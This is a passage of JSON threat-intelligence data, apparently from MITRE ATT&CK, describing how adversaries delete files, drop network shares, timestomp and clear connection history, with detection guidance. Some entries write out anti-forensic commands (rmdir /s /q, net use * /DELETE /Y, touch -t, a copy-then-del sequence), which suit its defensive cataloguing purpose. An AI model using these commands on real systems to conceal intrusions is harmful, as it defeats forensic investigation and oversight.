    "Description": "Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex:Ingress Tool Transfer) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.There are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well.[1]Examples of built-inCommand and Scripting Interpreterfunctions includedelon Windows,rmorunlinkon Linux and macOS, andrmon ESXi.",
    "Detects": [
      "Monitor executed commands and arguments for actions that could be utilized to unlink, rename, or delete files.",
      "Monitor for unexpected deletion of files from the system"
    ],
    "Procedure Examples": [
      "During the2015 Ukraine Electric Power Attack, vba_macro.exe deletes itself afterFONTCACHE.DAT,rundll32.exe, and the associated .lnk file is delivered.[2]",
      "AcidPourincludes a self-delete function where the malware deletes itself from disk after execution and program load into memory.[3]",
      "ADVSTORESHELLcan delete files and directories.[4]",
      "Anchorcan self delete its dropper after the malware is successfully deployed.[5]",
      "Apostlewrites batch scripts to disk, such assystem.batandremover.bat, that perform various anti-analysis and anti-forensic tasks, before finally deleting themselves at the end of execution.Apostleattempts to delete itself after encryption or wiping operations are complete and before shutting down the victim machine.[6]",
      "AppleJeushas deleted the MSI file after installation.[7]",
      "AppleSeedcan delete files from a compromised host after they are exfiltrated.[8]",
      "APT18actors deleted tools and batch files from victim systems.[9]",
      "APT28has intentionally deleted computer files to cover their tracks, including with use of the program CCleaner.[10]",
      "APT29has usedSDeleteto remove artifacts from victim networks.[11]",
      "APT3has a tool that can delete files.[12]",
      "APT32's macOS backdoor can receive a \"delete\" command.[13]",
      "APT38has used a utility called CLOSESHAVE that can securely delete a file from the system. They have also removed malware, tools, or other non-native files used during the intrusion to reduce their footprint or as part of the post-intrusion cleanup process.[14][15]",
      "APT39has used malware to delete files after they are deployed on a compromised host.[16]",
      "APT41deleted files from the system.[17][18]",
      "APT41 DUSTdeleted various artifacts from victim systems following use.[19]",
      "APT5has deleted scripts and web shells to evade detection.[20][21]",
      "Aquatic Pandahas deleted malicious executables from compromised machines.[22][23]",
      "ArcaneDoorincluded multiple instances of file deletion or removal during execution and other adversary actions.[24][25]",
      "Aria-bodyhas the ability to delete files and directories on compromised hosts.[26]",
      "Attor’s plugin deletes the collected files and log files after exfiltration.[27]",
      "AuditCredcan delete files from the system.[28]",
      "Azorultcan delete files from victim machines.[29]",
      "BabySharkhas cleaned up all files associated with the secondary payload execution.[30]",
      "BackConfighas the ability to remove files and folders related to previous infections.[31]",
      "Backdoor.Oldreacontains a cleanup module that removes traces of itself from the victim.[32]",
      "BADHATCHhas the ability to delete PowerShell scripts from a compromised machine.[33]",
      "Bandookhas a command to delete a file.[34]",
      "Bankshotmarks files to be deleted upon the next system reboot and uninstalls and removes itself from the system.[35]",
      "Bazarcan delete its loader using a batch file in the Windows temporary folder.[36]",
      "BBSRATcan delete files and directories.[37]",
      "Bisonalwill delete its dropper and VBS scripts from the victim’s machine.[38][39][40]",
      "BlackBytedeleted ransomware executables post-encryption.[41][42][43][44]",
      "BlackByte 2.0 Ransomwaredeletes itself following device encryption.[43]",
      "BLACKCOFFEEhas the capability to delete files.[45]",
      "BLINDINGCANhas deleted itself and associated artifacts from victim machines.[46]",
      "BLUELIGHTcan uninstall itself.[47]",
      "BOLDMOVEcan remove files on victim systems.[48]",
      "After initial setup,BPFDoor's original execution process deletes the dropped binary and exits.[49]",
      "TheBRONZE BUTLERuploader or malware the uploader usescommandto delete the RAR archives after they have been exfiltrated.[50]",
      "Bumblebeecan uninstall its loader through the use of aSdlcommand.[51]",
      "During theC0032campaign,TEMP.Velesroutinely deleted tools, logs, and other files after they were finished with them.[52]",
      "Calistohas the capability to userm -rfto remove folders and files from the victim's machine.[53]",
      "Carbanakhas a command to delete files.[54]",
      "Cardinal RATcan uninstall itself, including deleting its executable.[55]",
      "CARROTBAThas the ability to delete downloaded files from a compromised host.[56]",
      "ccf32can delete files and folders from compromised machines.[57]",
      "CharmPowercan delete created files from a compromised system.[58]",
      "Recent versions ofCherry Pickerdelete files and registry keys created by the malware.[59]",
      "Chimerahas performed file deletion to evade detection.[60]",
      "cmdcan be used to delete files from the file system.[61]",
      "COATHANGERremoves files from victim environments following use in multiple instances.[62]",
      "Cobalt Groupdeleted the DLL dropper from the victim’s machine to cover their tracks.[63]",
      "Crimsonhas the ability to delete files from a compromised host.[64][65][66]",
      "Cryptoistichas the ability delete files from a compromised host.[67]",
      "CSPY Downloaderhas the ability to self delete.[68]",
      "Cubacan use the commandcmd.exe /c delto delete its artifacts from the system.[69]",
      "DuringCutting Edge, threat actors deleted/tmp/test1.txton compromised Ivanti Connect Secure VPNs which was used to hold stolen configuration and cache files.[70][71]",
      "DanBotcan delete its configuration file after installation.[72]",
      "DarkGatehas deleted its staging directories.[73]",
      "DarkWatchmanhas been observed deleting its original launcher after installation.[74]",
      "Denishas a command to delete files from the victim’s machine.[75][76]",
      "Derusbiis capable of deleting files. It has been observed loading a Linux Kernel Module (LKM) and then deleting it from the hard disk as well as overwriting the data with null bytes.[77][78]",
      "Dragonflyhas deleted many of its files used during operations as part of cleanup, including removing applications and deleting screenshots.[79]",
      "Drovorubcan delete specific files from a compromised host.[80]",
      "Dtrackcan remove its persistence and delete itself.[81]",
      "DustySkycan delete files it creates from the infected system.[82]",
      "ECCENTRICBANDWAGONcan delete log files generated from the malware stored atC:\\windows\\temp\\tmp0207.[83]",
      "Eliseis capable of launching a remote shell on the host to delete itself.[84]",
      "Ember Beardeletes files related to lateral movement to avoid detection.[85]",
      "Epichas a command to delete a file from the machine.[86]",
      "EvilBunnyhas deleted the initial dropper after running through the environment checks.[87]",
      "Evilnumhas deleted files used during infection.[88]",
      "Exaramel for Linuxcan uninstall its persistence mechanism and delete its configuration file.[89]",
      "Exbytewill self-delete if a hard-coded configuration file is not found.[43]",
      "FALLCHILLcan delete malware and associated artifacts from the victim.[90]",
      "FatDukecan secure delete its DLL.[91]",
      "FELIXROOTdeletes the .LNK file from the startup directory as well as the dropper components.[92]",
      "Ferociouscan delete files from a compromised host.[93]",
      "FIN10has used batch scripts and scheduled tasks to delete critical system files.[94]",
      "FIN5usesSDeleteto clean up the environment and attempt to prevent detection.[95]",
      "FIN6has removed files from victim machines.[96]",
      "FIN8has deleted tmp and prefetch files during post compromise cleanup activities.FIN8has also deleted PowerShell scripts to evade detection on compromised machines.[97][98]",
      "FlawedAmmyycan execute batch scripts to delete files.[99]",
      "FruitFlywill delete files on the system.[100]",
      "FunnyDreamcan delete files including its dropper component.[57]",
      "Fysbishas the ability to delete files.[101]",
      "Gamaredon Grouptools can delete files used during an operation.[102][103][104]",
      "Gazerhas commands to delete files and persistence mechanisms from the victim.[105][106]",
      "Gelsemiumcan delete its dropper component from the targeted system.[107]",
      "gh0st RAThas the capability to to delete files.[108][109]",
      "Gold Dragondeletes one of its files, 2.hwp, from the endpoint after establishing persistence.[110]",
      "GoldenSpy's uninstaller can delete registry entries, files and folders, and finally itself once these tasks have been completed.[111]",
      "Gomirdeletes its original executable and terminates its original process after creating a systemd service.[112]",
      "Grandoreirocan delete .LNK files created in the Startup folder.[113]",
      "Green Lambertcan delete the original executable after initial installation in addition to unused functions.[114][115]",
      "GreyEnergycan securely delete a file by hooking into the DeleteFileA and DeleteFileW functions in the Windows API.[116]",
      "GrimAgentcan delete old binaries on a compromised host.[117]",
      "Malware used byGroup5is capable of remotely deleting files from victims.[118]",
      "GuLoadercan delete its executable from theAppData\\Local\\Tempdirectory on the compromised host.[119]",
      "HALFBAKEDcan delete a specified file.[120]",
      "Hancitorhas deleted files using the VBAkillfunction.[121]",
      "HAWKBALLhas the ability to delete files.[122]",
      "HermeticWiperhas the ability to overwrite its own file with random bites.[123][124]",
      "Heyoka Backdoorhas the ability to delete folders and files from a targeted system.[125]",
      "Hi-Zordeletes its RAT installer file as it executes its DLL payload file.[126]",
      "Hildegardhas deleted scripts after execution.[127]",
      "HotCroissanthas the ability to clean up installed files, delete files, and delete itself from the victim’s machine.[128]",
      "HTTPBrowserdeletes its original installer file once installation is complete.[129]",
      "Hydraqcreates a backdoor through which remote attackers can delete files.[130][131]",
      "HyperBrohas the ability to delete a specified file.[132]",
      "IceApplecan delete files and directories from targeted systems.[133]",
      "Imminent Monitorhas deleted files related to its dynamic debugger feature.[134]",
      "INC Ransomhas uninstalled tools from compromised endpoints after use.[135]",
      "InnaputRAThas a command to delete files.[136]",
      "InvisiMolehas deleted files and directories including XML and files successfully uploaded to C2 servers.[137][138]",
      "IPsec Helpercan delete itself when given the appropriate command.[6]",
      "Ixeshehas a command to delete a file from the machine.[139]",
      "TheJHUHUGITdropper can delete itself from the victim. AnotherJHUHUGITvariant has the capability to delete specified files.[140][141]",
      "JPIN's installer/uninstaller component deletes itself if it encounters a version of Windows earlier than Windows XP or identifies security-related processes running.[142]",
      "jRAThas a function to delete files from the victim’s machine.[143]",
      "Kazuarcan delete files.[144]",
      "Kevincan delete files created on the victim's machine.[145]",
      "KEYMARBLEhas the capability to delete files off the victim’s machine.[146]",
      "KillDiskhas the ability to quit and delete itself.[147]",
      "Kimsukyhas deleted the exfiltrated data on disk after transmission.Kimsukyhas also used an instrumentor script to terminate browser processes running on an infected system and then delete the cookie files on disk.[148][149][150]",
      "Kivarshas the ability to uninstall malware from the infected host.[151]",
      "TheKomplextrojan supports file deletion.[152]",
      "KONNIcan delete files.[153]",
      "KV Botnet Activityremoves on-disk copies of tools and other artifacts after it the primary botnet payload has been loaded into memory on the victim device.[154]",
      "Latrodectushas the ability to delete itself.[155][156]",
      "Lazarus Groupmalware has deleted files in various ways, including \"suicide scripts\" to delete malware binaries from the victim.Lazarus Groupalso uses secure file deletion to delete files from the victim.[157][158]",
      "LightNeuronhas a function to delete files.[159]",
      "Line Runnerremoves its initial ZIP delivery archive after processing the enclosed LUA script.[24]",
      "Linfocreates a backdoor through which remote attackers can delete files.[160]",
      "LiteDukecan securely delete files by first writing random data to the file.[91]",
      "LockBit 2.0can delete itself from disk after execution.[161][162][163]",
      "LockBit 3.0can delete itself from disk.[164][165]",
      "LockerGogahas been observed deleting its original launcher after execution.[166]",
      "Lokibotwill delete its dropped files after bypassing UAC.[167]",
      "LookBackremoves itself after execution and can delete files on the system.[168]",
      "LoudMinerdeleted installation files after completion.[169]",
      "LunarMailcan delete the previously used staging directory and files on subsequent rounds of exfiltration and replace it with a new one.[170]",
      "LunarWebcan self-delete from a compromised host if safety checks of C2 connectivity fail.[170]",
      "Once a file is uploaded,Machetewill delete it from the machine.[171]",
      "MacMacan delete itself from the compromised computer.[172]",
      "MacSpydeletes any temporary files it creates[173]",
      "Magic Houndhas deleted and overwrote files to cover tracks.[174][175][176]",
      "MagicRATcan delete files on victim systems, including itself.[177]",
      "AmenuPassmacro deletes files after it has decoded and decompressed them.[178][179]",
      "Once loaded into memory,MESSAGETAPdeletes the keyword_parm.txt and parm.txt configuration files from disk.[180]",
      "Metadorhas quickly deletedcbd.exefrom a compromised host following the successful deployment of their malware.[181]",
      "metaMainhas deleted collected items after uploading the content to its C2 server.[181][182]",
      "Metamorfohas deleted itself from the system after execution.[183][184]",
      "Meteorwill delete the folder containing malicious scripts if it detects the hostname asPIS-APP,PIS-MOB,WSUSPROXY, orPIS-DB.[185]",
      "Milancan delete files viaC:\\Windows\\system32\\cmd.exe /c ping 1.1.1.1 -n 1 -w 3000 > Nul & rmdir /s /q.[72]",
      "Misdatis capable of deleting the backdoor file.[186]",
      "MoonWindcan delete itself or specified files.[187]",
      "More_eggscan remove itself from a system.[63][188]",
      "Morican delete its DLL file and related files by Registry value.[189]",
      "Mosquitodeletes files using DeleteFileW API call.[190]",
      "MultiLayer Wiperuses a batch file,remover.batto delete malware artifacts and the batch file itself during execution.[191]",
      "MURKYTOPhas the capability to delete local files.[78]",
      "Mustang Pandawill delete their tools and files, and kill processes after their objectives are reached.[192]",
      "NanHaiShulaunches a script to delete their original decoy file to cover tracks.[193]",
      "Nebulaehas the ability to delete files and directories.[194]",
      "NICECURLhas a function to remove artifacts.[195]",
      "Nightdoorcan self-delete.[196]",
      "njRATis capable of deleting files.[197][198]",
      "NOKKIcan delete files to cover tracks.[199]",
      "OceanSaltcan delete files from the system.[200]",
      "ODAgentcan delete payloads and files used to pass C2 commands from remotely hosted cloud accounts.[201]",
      "OilRighas deleted files associated with their payload after execution.[202][203]",
      "Okrum's backdoor deletes files after they have been successfully uploaded to C2 servers.[204]",
      "OopsIEhas the capability to delete files and scripts from the victim's machine.[205]",
      "DuringOperation Dream Job,Lazarus Groupremoved all previously delivered files from a compromised computer.[206]",
      "DuringOperation Honeybee, the threat actors used batch files that reduced their fingerprint on a compromised system by deleting malware-related files.[207]",
      "DuringOperation Wocao, the threat actors consistently removed traces of their activity by first overwriting a file using/c cd /d c:\\windows\\temp\\ & copy \\\\<IP ADDRESS>\\c$\\windows\\system32\\devmgr.dll \\\\<IP ADDRESS>\\c$\\windows\\temp\\LMAKSW.ps1 /yand then deleting the overwritten file using/c cd /d c:\\windows\\temp\\ & del \\\\<IP ADDRESS>\\c$\\windows\\temp\\LMAKSW.ps1.[208]",
      "OSX_OCEANLOTUS.Dhas a command to delete a file from the system.OSX_OCEANLOTUS.Ddeletes the app bundle and dropper after execution.[209][210][211]",
      "OutSteelcan delete itself following the successful execution of a follow-on payload.[212]",
      "P.A.S. Webshellcan delete scripts from a subdirectory of /tmp after they are run.[89]",
      "Pasamcreates a backdoor through which remote attackers can delete files.[213]",
      "Patchworkremoved certain files and replaced them so they could not be retrieved.[214]",
      "Pay2Keycan remove its log file from disk.[215]",
      "PcSharehas deleted its files and components from a compromised host.[57]",
      "Penquincan delete downloaded executables after running them.[216]",
      "Pillowminthas deleted the filepath%APPDATA%\\Intel\\devmonsrv.exe.[217]",
      "Playhas used tools includingWevtutilto remove malicious files from compromised hosts.[218]",
      "PLEADhas the ability to delete files on the compromised host.[151]",
      "pngdownerdeletes content from C2 communications that was saved to the user's temporary directory.[219]",
      "PoetRAThas the ability to overwrite scripts and delete itself if a sandbox environment is detected.[220]",
      "Ponyhas used scripts to delete itself after execution.[221]",
      "PowerDukehas a command to write random data across a file and delete it.[222]",
      "PowerShowerhas the ability to remove all files created during the dropper process.[223]",
      "POWERSTATScan delete all files on the C:\\, D:\\, E:\\ and, F:\\ drives usingPowerShellRemove-Item commands.[224]",
      "After encrypting its own log files, the log encryption module inPrikormkadeletes the original, unencrypted files from the host.[225]",
      "ProLockcan remove files containing its payload after they are executed.[226]",
      "Protonremoves all files in the /tmp directory.[100]",
      "Proxysvccan delete files indicated by the attacker and remove itself from disk using a batch file.[158]",
      "Pteranodoncan delete files that may interfere with it executing. It also can delete temporary files and itself after the initial script executes.[227]",
      "PUNCHBUGGYcan delete files written to disk.[97][228]",
      "PyDCryptwill remove all created artifacts such as dropped executables.[229]",
      "Pysahas deleted batch files after execution.[230]",
      "QakBotcan delete folders and files including overwriting its executable with legitimate programs.[231][232][233][226]",
      "QUADAGENThas a command to delete its Registry key and scheduled task.[234]",
      "Raccoon Stealercan remove files related to use and installation.[235]",
      "RainyDayhas the ability to uninstall itself by deleting its service and files.[194]",
      "RansomHubhas the ability to self-delete.[236]",
      "Raspberry Robincan delete its initial delivery script from disk during execution.[237]",
      "RCSessioncan remove files from a targeted system.[238]",
      "RDATcan issue SOAP requests to delete already processed C2 emails.RDATcan also delete itself from the infected system.[239]",
      "RDFSNIFFERhas the capability of deleting local files.[240]",
      "Reaverdeletes the original dropped file from the victim.[241]",
      "RedCurlhas deleted files after execution.[242][243][244]",
      "RedLeavescan delete specified files.[245]",
      "Remsecis capable of deleting files on the victim. It also securely removes itself after collecting and exfiltrating data.[246][247][248]",
      "REvilcan mark its binary code for deletion after reboot.[249]",
      "Rising Suncan delete files and artifacts it creates.[250]",
      "ROADSWEEPcan use embedded scripts to remove itself from the infected host.[251][252]",
      "Rockehas deleted files on infected machines.[253]",
      "ROKRATcan request to delete files.[254]",
      "RTMcan delete all files created during its execution.[255][256]",
      "RunningRATcontains code to delete files from the victim’s machine.[110]",
      "S-Typehas deleted files it has created on a compromised host.[186]",
      "Saint Botcan run a batch script nameddel.batto remove anySaint Botpayload-linked files from a compromise system if anti-analysis or locale checks fail.[212]",
      "SomeSakulasamples use cmd.exe to delete temporary files.[257]",
      "SamSamhas been seen deleting its own files and payloads to make analysis of the attack more difficult.[258]",
      "Sandworm Teamhas used backdoors that can delete files used in an attack from an infected system.[147][259][260]",
      "SDBbothas the ability to delete files from a compromised host.[261]",
      "SDeletedeletes data in a way that makes it unrecoverable.[1]",
      "SeaDukecan securely delete files, including deleting itself from the victim.[262]",
      "Seasalthas a command to delete a specified file.[263]",
      "ServHelperhas a module to delete itself from the infected machine.[264][265]",
      "Sharkcan delete files downloaded to the compromised host.[72]",
      "ShimRatcan uninstall itself from compromised hosts, as well create and modify directories, delete, move, copy, and rename files.[266]",
      "ShrinkLockercan delete itself depending on various checks performed during execution.[267]",
      "Sibotwill delete itself if a certain server response is received.[268]",
      "Silencehas deleted artifacts, including scheduled tasks, communicates files from the C2 and other logs.[269][270]",
      "SILENTTRINITYcan remove files from the compromised host.[271]",
      "SLOTHFULMEDIAhas deleted itself and the 'index.dat' file on a compromised machine to remove recent Internet history from the system.[272]",
      "Solarhas the ability to delete staged files after they are uploaded to C2.[273]",
      "During theSolarWinds Compromise,APT29routinely removed their tools, including custom backdoors, once remote access was achieved.[274]",
      "SombRAThas the ability to runcancelorcloseanddeletestorageto remove all files from storage and delete the storage temp file on a compromised host.[275]",
      "SpeakUpdeletes files to remove evidence on the machine.[276]",
      "SQLRathas used been observed deleting scripts once used.[277]",
      "StealBitcan self-delete its executable file from the compromised system.[278][161]",
      "StoneDrillhas been observed deleting the temporary files once they fulfill their task.[279]",
      "StrifeWatercan self delete to cover its tracks.[280]",
      "StrongPitycan delete previously exfiltrated files from the compromised host.[281][282]",
      "Stuxnetuses an RPC server that contains a routine for file deletion and also removes itself from the system through a DLL export by deleting specific files.[283]",
      "SUNBURSThad a command to delete files.[274][284]",
      "Following the successful injection ofSUNBURST,SUNSPOTdeleted a temporary file it created namedInventoryManager.bkafter restoring the original SolarWinds Orion source code to the software library.[285]",
      "SysUpdatecan delete its configuration file from the targeted system.[286]",
      "Taidoorcan useDeleteFileAto remove files from infected hosts.[287]",
      "TAINTEDSCRIBEcan delete files from a compromised host.[288]",
      "TDTESScreates then deletes log files during installation of itself as a service.[289]",
      "TeamTNThas used a payload that removes itself after running.TeamTNTalso has deleted locally staged files for collecting credentials or scan results for local IP addresses after exfiltrating them.[290][291]",
      "The White Companyhas the ability to delete its malware entirely from the target system.[292]",
      "Threat Group-3390has deleted existing logs and exfiltrated file archives from a victim.[293][294]",
      "Trojan.Karaganyhas used plugins with a self-delete capability.[295]",
      "Troll Stealercreates and can execute a BAT script that will delete the malware.[296]",
      "Tropic Trooperhas deleted dropper files on an infected system using command scripts.[297]",
      "TYPEFRAMEcan delete files off the system.[298]",
      "UPSTYLEremovesbootstrap.min.cssafter parsing command and control instructions, restoring the file to its original state.[299]",
      "Uroburoscan run aClear Agents Trackcommand on an infected machine to deleteUroburos-related logs.[300]",
      "Ursnifhas deleted data staged in tmp files after exfiltration.[301]",
      "USBStealerhas several commands to delete files associated with the malware from the victim.[302]",
      "VBShowerhas attempted to complicate forensic analysis by deleting all the files contained in%APPDATA%..\\Local\\Temporary Internet Files\\Content.Wordand%APPDATA%..\\Local Settings\\Temporary Internet Files\\Content.Word\\.[303]",
      "VERMINcan delete files on the victim’s machine.[304]",
      "VersaMemdeleted files related to initial installation such as temporary files related to the PID of the main web process.[305]",
      "Volgmercan delete files and itself after infection to avoid analysis.[306]",
      "Volt Typhoonhas runrd /Sto delete their working directories and deleted systeminfo.dat fromC:\\Users\\Public\\Documentsfiles.[307][308]",
      "WhisperGatecan delete tools from a compromised host after execution.[309]",
      "WINDSHIELDis capable of file deletion along with other file system interaction.[310]",
      "WindTailhas the ability to receive and execute a self-delete command.[311]",
      "Wingbirddeletes its payload along with the payload's parent process after it finishes copying files.[312]",
      "Winnti for Windowscan delete the DLLs for its various components from a compromised host.[313]",
      "Wizard Spiderhas used file deletion to remove some modules and configurations from an infected host after use.[314]",
      "Woody RAThas the ability to delete itself from disk by creating a suspended notepad process and writing shellcode to delete a file into the suspended process usingNtWriteVirtualMemory.[315]",
      "XAgentOSXcontains the deletFileFromPath function to delete a specified file using the NSFileManager:removeFileAtPath method.[316]",
      "XLoadercan delete malicious executables from compromised machines.[317]",
      "Zebrocyhas a command to delete files and directories.[318][319][320]",
      "ZeroClearehas the ability to uninstall theRawDiskdriver and delete therwdskfile on disk.[251][321]",
      "Zeus Pandahas a command to delete a file. It also can uninstall scripts and delete files to cover its track.[322]",
      "zwShellhas deleted itself after creating a service as well as deleted a temporary file when the system reboots.[323]",
      "ZxShellcan delete files from the system.[17][324]"
    ]
  },
  "T1070.005": {
    "Name": "Indicator Removal:Network Share Connection Removal",
    "Description": "Adversaries may remove share connections that are no longer useful in order to clean up traces of their operation. Windows shared drive andSMB/Windows Admin Sharesconnections can be removed when no longer needed.Netis an example utility that can be used to remove network share connections with thenet use \\system\\share /deletecommand.[1]",
    "Detects": [
      "Monitor executed commands and arguments of net use commands associated with establishing and removing remote shares over SMB, including following best practices for detection of Windows Admin Shares.",
      "Monitoring for SMB traffic between systems may also be captured and decoded to look for related network share session and file transfer activity.",
      "Monitor for newly constructed processes and/or command line execution that can be used to remove network share connections via the net.exe process.Note: Event IDs are for Sysmon (Event ID 1 - process create) and Windows Security Log (Event ID 4688 - a new process has been created). The Analytic is oriented around looking for various methods of removing network shares via the command line, which is otherwise a rare event.Analytic 1- Network Share Connection Removal(source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"1\") OR (source=\"WinEventLog:Security\" EventCode=\"4688\") (Image= \"C:\\Windows\\System32\\net.exe\" AND CommandLine= \"delete\") OR CommandLine=\"Remove-SmbShare\" OR CommandLine=\"Remove-FileShare\" )",
      "Monitoring for Windows authentication logs are also useful in determining when authenticated network shares are established and by which account, and can be used to correlate network share activity to other events to investigate potentially malicious activity."
    ],
    "Procedure Examples": [
      "DUSTTRAPcan remove network shares from infected systems.[2]",
      "InvisiMolecan disconnect previously connected remote drives.[3]",
      "Thenet use \\system\\share /deletecommand can be used inNetto remove an established connection to a network share.[1]",
      "RobbinHooddisconnects all network shares from the computer with the commandnet use * /DELETE /Y.[4]",
      "Threat Group-3390has detached network shares after exfiltrating files, likely to evade detection.[5]"
    ]
  },
  "T1070.006": {
    "Name": "Indicator Removal:Timestomp",
    "Description": "Adversaries may modify file time attributes to hide new files or changes to existing files. Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder and blend malicious files with legitimate files.In Windows systems, both the$STANDARD_INFORMATION($SI) and$FILE_NAME($FN) attributes record times in a Master File Table (MFT) file.[1]$SI(dates/time stamps) is displayed to the end user, including in the File System view, while$FNis dealt with by the kernel.[2]Modifying the$SIattribute is the most common method of timestomping because it can be modified at the user level using API calls.$FNtimestomping, however, typically requires interacting with the system kernel or moving or renaming a file.[1]Adversaries modify timestamps on files so that they do not appear conspicuous to forensic investigators or file analysis tools. In order to evade detections that rely on identifying discrepancies between the$SIand$FNattributes, adversaries may also engage in \"double timestomping\" by modifying times on both attributes simultaneously.[3]In Linux systems and on ESXi servers, threat actors may attempt to perform timestomping using commands such astouch -a -m -t <timestamp> <filename>(which sets access and modification times to a specific value) ortouch -r <filename> <filename>(which sets access and modification times to match those of another file).[4][5]Timestomping may be used along with file nameMasqueradingto hide malware and tools.[6]",
    "Detects": [
      "Monitor executed commands and arguments for actions that could be taken to alter generated artifacts on a host system (e.g.,Timestomp.exe,SetMace.exe,touch -a -m -t,touch -r).[4]",
      "Monitor for modifications to file metadata. Compare the$STANDARD_INFORMATIONand$FILE_NAMEattributes in the Master File Table (MFT).[1]Additionally, look for nanoseconds in a timestamp matching \"0000000\". This often shows the use of an automated tool such as Metasploit.[1]",
      "Monitor for unexpected modifications to file timestamps.",
      "Monitor for API calls that may delete or alter generated artifacts on a host system. APIs (e.g.,SetFileTime,NtSetInformationFile,NtQueryInformationFile) can be utilized to manipulate timestamps.[72][1]"
    ],
    "Procedure Examples": [
      "3PARA RAThas a command to set certain attributes such as creation/modification timestamps on files.[7]",
      "APT28has performed timestomping on victim files.[8]",
      "APT29has used timestomping to alter the Standard Information timestamps on their web shells to match other files in the same directory.[9]",
      "APT32has used scheduled task raw XML with a backdated timestamp of June 2, 2016. The group has also set the creation time of the files dropped by the second stage of the exploit to match the creation time of kernel32.dll. Additionally,APT32has used a random value to modify the timestamp of the file storing the clientID.[10][11][12]",
      "APT38has modified data timestamps to mimic files that are in the same folder on a compromised host.[13]",
      "APT5has modified file timestamps.[14]",
      "Attorhas manipulated the time of last access to files and registry keys after they have been created or modified.[15]",
      "Bankshotmodifies the time of a file as specified by the control server.[16]",
      "BitPaymercan modify the timestamp of an executable so that it can be identified and restored by the decryption tool.[17]",
      "BlackByte 2.0 Ransomwarecan timestomp files for defense evasion and anti-forensics purposes.[18]",
      "BLINDINGCANhas modified file and directory timestamps.[19][20]",
      "BPFDooruses theutimes()function to change the executable's timestamp.[21]",
      "During theC0032campaign,TEMP.Velesused timestomping to modify the$STANDARD_INFORMATIONattribute on tools.[22]",
      "Chimerahas used a Windows version of the Linuxtouchcommand to modify the date and time stamp on DLLs.[23]",
      "CHIMNEYSWEEPcan time stomp its executable, previously dating it between 2010 to 2021.[24]",
      "China Chopper's server component can change the timestamp of files.[25][26][27]",
      "Cobalt Strikecan timestomp any files or payloads placed on a target machine to help them blend in.[28][29]",
      "DuringCutting Edge, threat actors changed timestamps of multiple files on compromised Ivanti Secure Connect VPNs to conceal malicious activity.[30][31]",
      "Cyclops Blinkhas the ability to use the Linux API functionutimeto change the timestamps of modified firmware update images.[32]",
      "TheDerusbimalware supports timestomping.[33][34]",
      "Eliseperforms timestomping of a CAB file it creates.[35]",
      "Empirecan timestomp any files or payloads placed on a target machine to help them blend in.[36]",
      "EVILNUMhas changed the creation date of files.[37]",
      "FALLCHILLcan modify file or directory timestamps.[38]",
      "For earlyGazerversions, the compilation timestamp was faked.[39]",
      "Gelsemiumhas the ability to perform timestomping of files on targeted systems.[40]",
      "InvisiMolesamples were timestomped by the authors by setting the PE timestamps to all zero values.InvisiMolealso has a built-in command to modify file times.[41]",
      "KeyBoytime-stomped its DLL in order to evade detection.[42]",
      "Kimsukyhas manipulated timestamps for creation or compilation dates to defeat anti-forensics.[43]",
      "Kobaloscan modify timestamps of replaced files, such assshwith the added credential stealer orsshdused to deployKobalos.[44]",
      "SeveralLazarus Groupmalware families use timestomping, including modifying the last write timestamp of a specified Registry key to a random date, as well as copying the timestamp for legitimate .exe files (such as calc.exe or mspaint.exe) to its dropped files.[45][46][47][48]",
      "MacMahas the capability to create and modify file timestamps.[49]",
      "metaMaincan change theCreationTime,LastAccessTime, andLastWriteTimefile time attributes when executed withSYSTEMprivileges.[50]",
      "ManyMisdatsamples were programmed using Borland Delphi, which will mangle the default PE compile timestamp of a file.[51]",
      "MultiLayer Wiperchanges timestamps of overwritten files to either 1601.1.1 for NTFS filesystems, or 1980.1.1 for all other filesystems.[52]",
      "NightClubcan modify the Creation, Access, and Write timestamps for malicious DLLs to match those of the genuine Windows DLL user32.dll.[53]",
      "Ninjacan change or create the last access or write times.[54]",
      "OSX_OCEANLOTUS.Dcan use thetouch -tcommand to change timestamps.[55][56]",
      "OwaAuthhas a command to timestop a file or directory.[57]",
      "PingPullhas the ability to timestomp a file.[58]",
      "POSHSPYmodifies timestamps of all downloaded executables to match a randomly selected file created prior to 2013.[59]",
      "PowerStallionmodifies the MAC times of its local log files to match that of the victim's desktop.ini file.[60]",
      "Psylohas a command to conduct timestomping by setting a specified file’s timestamps to match those of a system file in the System32 directory.[61]",
      "Rockehas changed the time stamp of certain files.[62]",
      "SEASHARPEEcan timestomp files on victims using a Web shell.[63]",
      "Shamooncan change the modified time for files to evade forensic detection.[64]",
      "During theSolarWinds Compromise,APT29modified timestamps of backdoors to match legitimate Windows files.[65]",
      "Stuxnetextracts and writes driver files that match the times of other legitimate files.[66]",
      "TAINTEDSCRIBEcan change the timestamp of specified filenames.[67]",
      "After creating a new service for persistence,TDTESSsets the file creation time for the service to the creation time of the victim's legitimate svchost.exe file.[68]",
      "UPSTYLErestores timestamps to original values following modification.[69]",
      "USBStealersets the timestamps of its dropper files to the last-access and last-write timestamps of a standard Windows library chosen on the system.[70]",
      "Winnti for Windowscan set the timestamps for its worker and service components to match that of cmd.exe.[71]"
    ]
  },
  "T1070.007": {
    "Name": "Indicator Removal:Clear Network Connection History and Configurations",
    "Description": "Adversaries may clear or remove evidence of malicious network connections in order to clean up traces of their operations. Configuration settings as well as various artifacts that highlight connection history may be created on a system and/or in application logs from behaviors that require network connections, such asRemote ServicesorExternal Remote Services. Defenders may use these artifacts to monitor or otherwise analyze network connections created by adversaries.Network connection history may be stored in various locations. For example, RDP connection history may be stored in Windows Registry values under[1]:HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\DefaultHKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\ServersWindows may also store information about recent RDP connections in files such asC:\\Users\\%username%\\Documents\\Default.rdpandC:\\Users\\%username%\\AppData\\Local\\Microsoft\\TerminalServer Client\\Cache\\.[2]Similarly, macOS and Linux hosts may store information highlighting connection history in system logs (such as those stored in/Library/Logsand/or/var/log/).[3][4][5]Malicious network connections may also require changes to third-party applications or network configuration settings, such asDisable or Modify System Firewallor tampering to enableProxy. Adversaries may delete or modify this data to conceal indicators and/or impede defensive analysis.",
    "Detects": [
